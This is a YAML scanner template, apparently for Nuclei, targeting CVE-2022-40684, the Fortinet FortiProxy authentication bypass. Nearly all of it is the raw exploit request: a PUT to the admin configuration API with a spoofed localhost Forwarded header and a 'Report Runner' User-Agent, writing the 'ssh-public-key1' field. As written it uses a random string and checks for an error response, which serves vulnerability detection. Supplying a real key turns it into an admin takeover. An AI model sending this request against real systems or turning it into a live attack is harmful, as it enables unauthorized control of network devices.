id: cve-2022-40684-auth-bypass
info:
  name: Fortinet FortiProxy Authentication IDOR CVE-2022-40684
  author: z92g(https://github.com/z92g)
  severity: critical
  description: |
    This template exploits an authentication bypass vulnerability in Fortinet FortiProxy (CVE-2022-40684). It sends a crafted PUT request to manipulate the admin configuration and checks the response for specific error messages.
  reference:
    - https://github.com/kljunowsky/CVE-2022-40684-POC
http:
  - raw:
      - |
        PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Forwarded: for="[127.0.0.1]:8888";by="[127.0.0.1]:8888"
        User-Agent: Report Runner

        {"ssh-public-key1": "{{key}}"}
    payloads:
      key:
        - "{{rand_text_alpha(10)}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "Invalid SSH public key.\nnode_check_object fail! for ssh-public-key1"
        part: body
